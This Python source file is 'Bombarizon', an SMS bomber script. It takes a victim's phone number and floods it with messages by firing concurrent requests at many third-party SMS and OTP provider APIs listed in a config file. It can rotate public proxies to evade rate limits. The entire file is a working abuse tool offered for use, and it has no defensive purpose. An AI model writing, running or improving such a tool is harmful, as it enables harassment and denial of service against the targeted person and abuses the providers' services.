#!/usr/bin/env python3

# Bombarizon - A clean, small and powerful SMS bomber script.
# Copyright (C) 2020 Avinash Reddy <https://github.com/AvinashReddy3108>
#
# Bombarizon is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# Bombarizon is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with Bombarizon.  If not, see <https://www.gnu.org/licenses/>.

from concurrent.futures import ThreadPoolExecutor
from utils import APIRequestsHandler, CustomArgumentParser
import json
import requests
import random
import time

ascii_art = r"""

___________________________$$
 _________________________$$$$
 _______________________$$$$$$
 ______________________$$$$$$
 ______________________$$$$
 ______________________$$
 _________$$$$$$$$$$$$$_$$$$$$$$$$$$$
 ______$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
 ____$$$$Tool$$By$The$Otherside$$$$$$$$$$
 ___$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
 __$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
 _$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
 _$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
 _$$$$$$$$$$$$$$$$$Security $$$$$$$$$$
 __$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
 ___$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
 ____$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
 _____$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
 ______$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
 ________$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
 __________$$$$$$$$$$$$$$$$$$$$$$$$$
 ____________$$$$$$$$$$$$$$$$$$$$$
 ______________$$$$$$$$V.01$$$$$$
 
"""

parser = CustomArgumentParser(
    allow_abbrev=False,
    add_help=False,
    description="Bombarizon - A clean, small and powerful SMS bomber script.",
    epilog="Use this for fun, not for revenge or bullying!",
)
parser.add_argument(
    "target",
    metavar="TARGET",
    type=lambda x: (13 >= len(str(int(x))) >= 4)
    and int(x)
    or parser.error('"%s" is an invalid mobile number!' % int(x)),
    help="Target mobile number without country code.",
)
parser.add_argument(
    "--config-path",
    "-c",
    default="api_config.json",
    help="Path to API config file. (NOTE: the file must be in JSON format!)",
)
parser.add_argument(
    "--num", "-N", type=int, help="Number of SMSs to send to TARGET.", default=30
)
parser.add_argument(
    "--country",
    "-C",
    type=int,
    help="Country code without (+) sign.",
    default=91,
)
parser.add_argument(
    "--threads",
    "-T",
    type=int,
    help="Max number of concurrent HTTP(s) requests.",
    default=15,
)
parser.add_argument(
    "--timeout",
    "-t",
    type=int,
    help="Time (in seconds) to wait for an API request to complete.",
    default=10,
)
parser.add_argument(
    "--proxy",
    "-P",
    action="store_true",
    help="Use proxy for bombing. (Recommended for large number of SMSs)",
)
parser.add_argument(
    "--verbose",
    "-v",
    action="store_true",
    help="Enables verbose output, for debugging.",
)
parser.add_argument(
    "--verify",
    "-V",
    action="store_true",
    help="To verify all providers are working or not.",
)
parser.add_argument("-h", "--help", action="help", help="Display this message.")
args = parser.parse_args()

# config loading
config = args.config_path
target = str(args.target)
country_code = str(args.country)
no_of_threads = args.threads
no_of_sms = args.num
failed, success = 0, 0

print(ascii_art)
not args.verbose and not args.verify and print(
    f"Target: {target} | Threads: {no_of_threads} | SMS-Bombs: {no_of_sms}"
)


# proxy setup
def get_proxy():
    args.verbose and print("Fetching proxies from server.....")
    curl = requests.get("http://pubproxy.com/api/proxy?format=txt").text
    if "http://pubproxy.com/#premium" in curl:
        args.verbose and print(
            "Proxy limitation error, proceeding without a proxy now.."
        )
        return
    args.verbose and print(f"Using Proxy: {curl}")
    return {"http": curl, "https": curl}


proxies = get_proxy() if args.proxy else None


# bomber function
def bomber(p):
    global failed, success, no_of_sms
    if not args.verify and p is None or success > no_of_sms:
        return
    elif not p.done:
        try:
            p.start()
            if p.status():
                success += 1
            else:
                failed += 1
        except:
            failed += 1
    not args.verbose and not args.verify and print(
        f"Requests: {success+failed} | Success: {success} | Failed: {failed}",
        end="\r",
    )
    if args.proxy and ((failed) // random.randint(5, 10)) == 0:
        global proxies
        proxies = get_proxy()


# threadsssss
start = time.time()
providers = json.load(open(config, "r", encoding="UTF-8"))["providers"]
if args.verify:
    pall = [p for x in providers.values() for p in x]
    print(f"Processing {len(pall)} providers, please wait!\n")
    with ThreadPoolExecutor(max_workers=len(pall)) as executor:
        for config in pall:
            executor.submit(
                bomber,
                APIRequestsHandler(
                    target,
                    proxy=proxies,
                    verbose=args.verbose,
                    verify=True,
                    timeout=args.timeout,
                    cc=country_code,
                    config=config,
                ),
            )
else:
    with ThreadPoolExecutor(max_workers=no_of_threads) as executor:
        while success <= no_of_sms:
            p = APIRequestsHandler(
                target,
                proxy=proxies,
                verbose=args.verbose,
                timeout=args.timeout,
                cc=country_code,
                config=random.choice(
                    providers[country_code] + providers["multi"]
                    if country_code in providers
                    else providers["multi"]
                ),
            )
            executor.submit(bomber, p)
end = time.time()

# finalize
if args.verbose or args.verify:
    print(f"\nSuccess: {success} | Failed: {failed}")
else:
    print()
print(f"Took {end-start:.2f}s to complete")
